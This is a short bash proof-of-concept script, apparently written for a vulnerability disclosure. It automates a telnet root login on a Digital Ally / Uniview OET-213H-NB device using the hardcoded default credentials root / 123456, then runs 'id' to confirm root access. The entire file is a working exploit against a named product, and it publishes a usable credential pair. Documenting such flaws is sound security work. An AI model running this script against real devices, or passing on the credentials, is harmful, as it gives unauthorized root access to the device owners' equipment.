#!/bin/bash
# PoC: Default Telnet Root Credentials
# Target: Digital Ally / Uniview OET-213H-NB
# Credentials: root / 123456

TARGET="${1:-192.168.30.178}"

echo "[*] Connecting to $TARGET:23 with default credentials"
expect -c "
set timeout 15
spawn ncat $TARGET 23
expect -re \"login:\"
send \"root\r\"
expect -re \"assword:\"
send \"123456\r\"
expect -re \">\"
puts \"\n[+] SUCCESS - Logged in as root\"
send \"id\r\"
expect -re \">\"
send \"exit\r\"
expect eof
"
